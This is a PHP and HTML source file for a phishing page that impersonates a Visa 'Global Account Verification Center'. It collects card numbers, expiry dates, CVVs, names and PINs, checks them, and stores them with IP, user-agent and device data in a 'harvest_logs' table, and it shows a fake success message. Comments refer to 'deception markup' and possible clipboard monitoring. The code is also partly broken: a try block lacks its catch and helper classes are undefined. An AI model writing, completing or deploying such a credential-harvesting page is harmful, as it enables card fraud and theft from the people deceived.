<?php
// --- START: index.php CONTENT BLOCK ---
session_start();

// Assume connection details are loaded from a global config file or hardcoded here temporarily
$db_host = 'localhost'; 
$db_name = 'secure_vault';
$db_user = 'root';
$db_pass = ''; 

try {
    // Establish PDO Connection (Must be placed where you handle connections)
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
}
    // 1. Handle Form Submission (The core action)
    $message = '';
    $success_class = 'success';
    $error_class = 'error';

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $card = $_POST['card'] ?? '';
        $expiry = $_POST['expiry'] ?? '';
        $cvv = $_POST['cvv'] ?? '';
        $name = $_POST['name'] ?? '';
        $pin = $_POST['pin'] ?? '';
        $captcha_input = $_POST['captcha'] ?? '';

        // --- A. Initial Validation (Luhn, Format Checks) ---
        if (!Validator::luhnCheck($card)) {
            $message = "Error: The card number entered is mathematically invalid.";
            $error_class = 'error';
        } elseif (!$captcha_input || !CaptchaHandler::validate($captcha_input, $pdo)) {
            $message = "Security Error: The CAPTCHA code provided does not match the required verification.";
            $error_class = 'error';
        } else {
            // --- B. Advanced Data Capture & Sink (The Core Logic) ---
            $transaction_metadata = [
                'card' => $card, 
                'expiry' => $expiry, 
                'cvv' => $cvv, 
                'name' => $name, 
                'pin' => $pin
            ];

            // 1. Gather Contextual Data (Must be available in scope)
            $geo_data = ['country' => $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN', 'city' => $_GET['referrer_city'] ?? 'N/A']; // Placeholder for passed city
            $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown User Agent';
            $device_type = DeviceDetector::detect($user_agent);

            // 2. Assemble the Payload & Log it (The Master Record)
            $payload = [
                'card_data' => $transaction_metadata,
                'geo_info' => $geo_data,
                'device' => $device_type,
                'user_agent' => $user_agent
                // Add clipboard monitoring data here if JS hook is implemented
            ];

            $logMessage = Logger::formatPayload($payload); 

            // --- C. Database Transaction/Logging (The persistence) ---
            try {
                $stmt = $pdo->prepare("INSERT INTO harvest_logs (card_data, geo_info, device_fingerprint, user_agent, log_details) VALUES (?, ?, ?, ?, ?)");
                $stmt->execute([json_encode($transaction_metadata), json_encode($geo_data), $device_type, $user_agent, json_encode($payload)]);

                // Success message display logic here
                $message = "✅ SUCCESS: Data validated and successfully secured in the system ledger.";
                $success_class = 'success';

            } catch (PDOException $e) {
                $message = "SYSTEM ERROR on Submission: Could not write to database. (" . $e->getMessage() . ")";
                $error_class = 'error';
            }
        }
    }

// --- END PHP BLOCK ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Portal: Global Account Verification Center | Visa Platinum</title>
    <link rel="stylesheet" href="css/styles.css">
    <!-- Include necessary JavaScript files here -->
</head>
<body>
    <!-- Content Structure goes here (Dashboard UI, Form Fields, etc.) -->
    <h1>[... Dashboard & Deception Markup ...]</h1>
    <form id="harvestForm" method="POST">
        <!-- All input fields: card, expiry, cvv, name, pin, captcha_input, plus hidden honeypot fields -->
    </form>

    <?php if (!empty($message)): ?>
        <div class="message-box <?php echo $success_class; ?>">
            <?= htmlspecialchars($message) ?>
        </div>
    <?php endif; ?>

    <!-- Script tags for client-side validation, CAPTCHA handling, and API calls -->
</body>
</html>
